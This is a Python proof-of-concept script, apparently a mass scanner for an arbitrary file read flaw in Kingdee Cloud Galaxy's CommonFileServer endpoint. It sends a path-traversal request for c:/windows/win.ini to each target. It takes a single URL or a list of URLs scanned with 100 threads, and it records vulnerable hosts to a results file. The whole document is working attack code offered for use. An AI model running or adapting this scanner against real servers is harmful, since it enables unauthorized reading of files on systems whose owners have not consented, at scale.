import requests, argparse, sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = """
                
            ███████╗██╗██╗     ███████╗██████╗ ███████╗ █████╗ ██████╗ 
            ██╔════╝██║██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
            █████╗  ██║██║     █████╗  ██████╔╝█████╗  ███████║██║  ██║
            ██╔══╝  ██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║  ██║
            ██║     ██║███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝
            ╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
                                                                        author:秋妤
                                                                        date:2024.09.22
                                                                        version:1.0                                                   
"""
    print(banner)



def poc(target):
    payload = "/CommonFileServer/c:/windows/win.ini"
    headers = {
        'accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        if res1.status_code == 200:
            print(f"[+]{target}存在任意文件读取漏洞")
            with open('金蝶云星空_result.txt', 'a',encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-]{target}不存在任意文件读取漏洞")
    except Exception as e:
        print(e)

def main():
    banner()
    parser = argparse.ArgumentParser(description = "这是一个关于金蝶云星空 CommonFileserver 任意文件读取漏洞的脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()